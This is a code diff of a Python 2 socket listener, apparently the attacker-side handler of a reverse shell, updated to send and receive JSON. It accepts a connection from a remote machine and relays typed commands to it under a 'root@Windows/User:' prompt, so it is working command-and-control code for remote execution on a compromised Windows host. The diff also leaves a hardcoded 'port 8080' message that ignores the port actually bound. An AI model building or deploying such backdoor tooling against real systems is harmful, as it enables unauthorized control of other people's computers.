@@ -1,4 +1,5 @@
 import socket
+import json
 
 class SocketListener:
     def __init__(self,ip,port):
@@ -6,19 +7,30 @@ class SocketListener:
         listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)  # Use instance multiple times
         listener.bind((ip,port))
         listener.listen(0)
-        print(f"Listening on port {port}...")
+        print("Listening on port 8080...")
 
         (self.connection,address) = listener.accept()
 
         print("Listening established..." + str(address))
 
+    #Sending Input
+    def json_send(self,data):
+        json_data = json.dumps(data)
+        self.connection.send(json_data.encode())
+
+    # Process Input
+    def json_receive(self):
+        json_data = self.connection.recv(1024)
+        return json.loads(json_data.decode())
+
+    # Getting Input
     def command_execution(self,command_input):
-        self.connection.send(command_input)
-        return self.connection.recv(1024)
+        self.json_send(command_input)
+        return self.json_receive()
 
     def start_listener(self):
         while True:
-            command_input = raw_input("Enter command: ")
+            command_input = raw_input("root@Windows/User: ")
             command_output = self.command_execution(command_input)
             print(command_output)
 
